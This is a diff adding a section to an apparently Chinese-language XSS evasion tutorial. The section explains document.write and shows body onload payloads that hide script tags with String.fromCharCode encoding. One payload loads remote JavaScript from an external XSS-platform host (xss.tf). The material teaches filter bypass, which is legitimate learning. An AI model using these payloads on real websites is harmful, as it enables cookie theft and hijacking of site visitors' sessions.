@@ -216,3 +216,25 @@
   
   ![24](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vbelprdpj30uj09gaav.jpg)
   
+  ### document.write
+  - - -
+  document.write向页面输出内容。
+  
+  ![25](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vbz3gyc7j30ba07g0so.jpg)
+  
+  ![26](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vbzi317vj30e404owef.jpg)
+  
+  `<script>alert(1)</script>`Ascii编码
+   ```html
+   <body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) >
+   ```
+   
+   ![27](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vceyzxrjj30uj09awfb.jpg)
+   
+   也可以直接插入js代码`<sCrIpt srC=http://xss.tf/eeW></sCRipT>`
+   
+   ```html
+   <body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,104,116,116,112,58,47,47,120,115,115,46,116,102,
+47,101,101,87,62,60,47,115,67,82,105,112,84,62))>
+   ```
+  ![28](https://ws1.sinaimg.cn/large/005DAKuvgy1g1vcldwwrrj30uj0a9ab8.jpg)
